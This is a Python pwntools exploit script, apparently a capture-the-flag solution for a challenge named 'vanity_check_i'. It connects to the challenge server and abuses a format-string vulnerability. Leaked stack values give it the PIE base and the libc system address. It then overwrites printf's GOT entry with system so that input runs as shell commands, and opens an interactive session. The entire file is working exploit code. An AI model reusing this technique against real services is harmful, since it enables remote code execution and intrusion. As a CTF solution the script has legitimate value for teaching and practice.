#!/usr/bin/python3
from pwn import *

exe = './vanity_check_i_patched'
elf = context.binary = ELF(exe, checksec = False)
context.log_level='info'

libc = ELF("./libc-2.31.so", checksec = False)

# Function called by FmtStr
def send_payload(payload):
    len_recv = 1
    io.sendline(payload)
    recv = io.recvuntil(b'\n').strip()
    return recv

#io = process(exe)
io = remote('vanity-check-i.idek.team', 1337)

io.recvline_contains(b'service!)\n')

format_string = FmtStr(execute_fmt=send_payload) #Find offset in Format String vulnerability

if 'remote' in str(io): #Different position local and remote for the Pie base addr calculation
    io.sendline(b'%83$p')
else:
    io.sendline(b'%32$p')

recv = io.recvuntil(b'\n').strip()

pie_leaked = int(recv.rstrip()[-14:], 16)
elf.address = pie_leaked - 64 #Offset got from gdb-pwndbg with command: piebase
info('Pie Base: %#x', elf.address)

io.sendline(b'%34$p')
recv = io.recvuntil(b'\n').strip()

system_leaked = int(recv.rstrip()[-14:], 16)
system_addr = system_leaked - 1686456 #Offset got from gdb-pwndbg with command: p system
info('System address: %#x:', system_addr)

got_printf = elf.address + 0x33c0 #offset of printf in .got section
info('Printf: %#x', got_printf)

format_string.write(got_printf, system_addr) #write system_addr in got_printf
format_string.execute_writes()

io.interactive()
